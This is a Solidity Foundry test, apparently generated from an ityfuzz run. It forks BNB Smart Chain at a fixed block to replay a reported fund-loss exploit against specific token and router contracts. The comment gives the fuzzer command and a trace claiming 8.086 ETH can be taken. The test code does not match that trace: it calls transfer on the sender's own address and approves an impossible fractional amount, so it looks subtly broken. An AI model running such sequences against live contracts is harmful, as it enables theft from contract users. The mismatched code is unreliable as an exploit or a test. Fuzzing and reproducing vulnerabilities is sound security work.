// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0x5c811d550E421bcc37cb2097AF5b40Eb62Cf6d7A,0xA0ED3C520dC0632657AD2EaaF19E26C4fD431a84 -c bsc --onchain-block-number 23695904 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Fund Loss]: Anyone can earn 8.086 ETH by interacting with the provided contracts

================ Trace ================
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   ├─[1] Router.swapExactETHForTokens{value: 0}(0, path:(WETH → 0xa0ED3C520dC0632657AD2EaaF19E26C4fD431a84), address(this), block.timestamp);
   └─[1] Router.swapExactETHForTokens{value: 10.0 ether}(0, path:(WETH → 0xa0ED3C520dC0632657AD2EaaF19E26C4fD431a84), address(this), block.timestamp);
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   └─[1] 0xa0ED3C520dC0632657AD2EaaF19E26C4fD431a84.approve(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 1065206540208516089514440839393939258229932191397749163438.7575 ether)


 */

contract Cbb4C is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 23695904);
    }

    function test() public {
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        IERC20(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd).transfer(0xa0ED3C520dC0632657AD2EaaF19E26C4fD431a84, 0);
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        IERC20(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd).transfer(0xa0ED3C520dC0632657AD2EaaF19E26C4fD431a84, 10.0 ether);
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        IERC20(0xa0ED3C520dC0632657AD2EaaF19E26C4fD431a84).approve(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 1065206540208516089514440839393939258229932191397749163438.7575 ether);
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
